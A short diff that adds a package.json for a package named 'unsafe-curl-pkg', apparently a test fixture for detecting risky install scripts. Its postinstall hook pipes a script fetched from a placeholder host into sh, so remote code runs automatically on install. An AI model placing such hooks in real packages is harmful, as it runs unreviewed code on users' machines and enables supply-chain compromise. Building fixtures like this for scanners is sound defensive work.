@@ -1,0 +1,7 @@
+{
+  "name": "unsafe-curl-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | sh"
+  }
+}
